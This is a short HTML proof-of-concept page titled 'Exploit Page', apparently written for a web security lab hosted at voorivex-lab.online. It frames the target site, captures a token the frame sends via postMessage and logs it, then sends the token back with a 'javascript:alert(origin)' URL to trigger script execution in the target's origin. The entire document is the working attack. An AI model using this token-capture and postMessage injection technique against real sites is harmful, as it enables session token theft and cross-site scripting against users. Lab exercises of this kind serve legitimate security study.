    <title>Exploit Page</title>

  <body>
    <iframe
      id="myIframe"
      src="https://ID.voorivex-lab.online/"
      width="600"
      height="400"
    ></iframe>

    <script>
      const iframe = document.getElementById("myIframe");
      const iframeOrigin = "https://ID.voorivex-lab.online"; 
      window.addEventListener("message", function (event) {
        console.log("Captured token: ", event.data);

        if (event.origin === iframeOrigin && event.data && event.data.token) {
          const token = event.data.token;

          iframe.contentWindow.postMessage(
            { token: token, url: "javascript:alert(origin)" },
            iframeOrigin,
          );
        }
      });
    </script>
  </body>
